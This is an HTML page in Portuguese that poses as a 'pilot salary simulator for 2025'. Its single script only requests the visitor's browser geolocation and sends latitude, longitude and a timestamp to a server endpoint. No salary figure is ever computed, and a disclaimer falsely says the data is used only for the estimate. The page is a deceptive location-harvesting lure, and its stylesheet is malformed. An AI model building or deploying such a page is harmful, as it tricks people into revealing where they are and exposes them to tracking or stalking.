<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Simulador Salarial de Pilotos 2025</title>
    <style>
        body {
    font-family: 'Segoe UI', sans-serif;
    background-image: url('https://passagembaixacg.s3.us-east-2.amazonaws.com/IMG_2927.jpeg');
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
    color: #fff;
    text-align: center;
    padding: 40px 20px;
    height: 100vh;
    margin: 0;
}
<body>
  <div class="overlay">
    <!-- todo seu conteúdo aqui -->
  </div>
</body>

.overlay {
    background-color: rgba(0, 0, 0, 0.6); /* fundo escurecido */
    padding: 40px;
    border-radius: 10px;
    max-width: 700px;
    margin: auto;
    margin-top: 60px;
}

        .container {
            max-width: 700px;
            margin: auto;
            background-color: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 0 20px rgba(0,0,0,0.6);
        }

        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            color: #ffd700;
        }

        p {
            font-size: 18px;
            margin-bottom: 25px;
        }

        img {
            width: 100%;
            max-width: 500px;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        button {
            padding: 12px 25px;
            font-size: 18px;
            background-color: #ffd700;
            color: #000;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
        }

        button:hover {
            background-color: #e6c200;
        }

        #status {
            margin-top: 20px;
            font-size: 16px;
            font-style: italic;
        }

        .disclaimer {
            margin-top: 30px;
            font-size: 12px;
            color: #ccc;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>✈️ Descubra quanto um piloto como você deveria ganhar em 2025!</h1>
        <p>Simulador exclusivo baseado no seu perfil e localização. Leva menos de 1 minuto.</p>
        <img src="https://passagembaixacg.s3.us-east-2.amazonaws.com/IMG_2927.jpeg" alt="Simulação de Carreira">
        <button onclick="getLocation()">Fazer simulação agora</button>
        <div id="status"></div>
        <p class="disclaimer">*Todos os dados são confidenciais e usados apenas para cálculo estimado.</p>
    </div>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const data = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            timestamp: new Date().toISOString()
                        };
                        document.getElementById('status').innerText = 'Simulação sendo calculada...';
                        fetch('/api/dados', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data)
                        }).then(() => {
                            document.getElementById('status').innerText = 'Dados recebidos. Aguarde o resultado no painel.';
                        });
                    },
                    (error) => {
                        document.getElementById('status').innerText = 'Erro ao obter localização: ' + error.message;
                    }
                );
            } else {
                document.getElementById('status').innerText = 'Seu navegador não suporta geolocalização.';
            }
        }
    </script>
</body>
</html>
